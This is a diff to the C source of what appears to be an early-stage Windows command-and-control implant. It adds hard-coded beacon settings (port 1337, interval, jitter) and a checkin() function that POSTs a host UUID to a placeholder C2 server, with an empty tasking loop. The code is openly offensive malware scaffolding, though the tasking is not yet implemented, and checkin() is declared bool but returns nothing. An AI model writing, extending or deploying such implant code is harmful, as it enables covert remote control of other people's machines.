@@ -2,6 +2,7 @@
 #include <stdint.h>
 #include <windows.h>
 #include <wininet.h>
+#include <stdbool.h>
 #include <stdio.h>
 #include <string.h>
 typedef struct {
@@ -21,18 +22,35 @@ typedef struct {
     char killdate[32];  //
 } implant_config;
 
+//implant_config config_r = {
+//    .host = "REPLACE_ME_HOST",
+//    .port = REPLACE_ME_PORT,     
+//    .uuid = "REPLACE_ME_UUID",
+//    .interval = REPLACE_ME_INTERVAL, //
+//    .jitter = REPLACE_ME_JITTER,      //
+//    .get_uri = "REPLACE_ME_GET_URI",  
+//    .post_uri = "REPLACE_ME_POST_URI",
+//    .query_path_name = "REPLACE_ME_QUERY_PATH_NAME",
+//    .eec = REPLACE_ME_EEC,        
+//    .proxy_host = "REPLACE_ME_PROXY_HOST", //
+//    .proxy_port = "REPLACE_ME_PROXY_PORT", //
+//    .proxy_user = "REPLACE_ME_PROXY_USER", // 
+//    .proxy_pass = "REPLACE_ME_PROXY_PASS", //
+//    .killdate = "REPLACE_ME_KILLDATE" //
+//};
+
 implant_config config = {
     .host = "REPLACE_ME_HOST",
-    .port = REPLACE_ME_PORT,     
+    .port = 1337,     
     .uuid = "REPLACE_ME_UUID",
-    .interval = REPLACE_ME_INTERVAL, //
-    .jitter = REPLACE_ME_JITTER,      //
+    .interval = 420, //
+    .jitter = 69,      //
     .get_uri = "REPLACE_ME_GET_URI",  
     .post_uri = "REPLACE_ME_POST_URI",
     .query_path_name = "REPLACE_ME_QUERY_PATH_NAME",
-    .eec = REPLACE_ME_EEC,        
+    .eec = 1,        
     .proxy_host = "REPLACE_ME_PROXY_HOST", //
-    .proxy_port = "REPLACE_ME_PROXY_PORT", //
+    .proxy_port = "PROXY_PORT", //
     .proxy_user = "REPLACE_ME_PROXY_USER", // 
     .proxy_pass = "REPLACE_ME_PROXY_PASS", //
     .killdate = "REPLACE_ME_KILLDATE" //
@@ -65,13 +83,24 @@ void send_c2_post_request(char* json_data) {
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
 }
-
+bool checkin(){
+        char json_buff[150];
+    snprintf(json_buff,sizeof(json_buff),"{\"action\": \"checkin\", \"uuid\": \"%s\", \"os\": \"NOT IMPLEMENTED\", \"user\": \"NOT IMPLEMENTED\", \"host\": \"NOT IMPLEMENTED\", \"pid\": 0, \"architecture\": \"x64\"}",config.uuid);
+    send_c2_post_request(json_buff); //checkin do serwera
+}
 	
+void get_tasks(){
+
+return;
+}
 int main(){
 	char json_buff[512];
-	snprintf(json_buff,sizeof(json_buff),"{\"action\": \"checkin\", \"uuid\": \"%s\", \"os\": \"NOT IMPLEMENTED\", \"user\": \"NOT IMPLEMENTED\", \"host\": \"NOT IMPLEMENTED\", \"pid\": 0, \"architecture\": \"x64\"}",config.uuid);
-    send_c2_post_request(json_buff); //checkin do serwera
-    
+	checkin();
+//main loop
+    for(;;){
+        get_tasks();
+
+    }
 
 	return 0;
 }
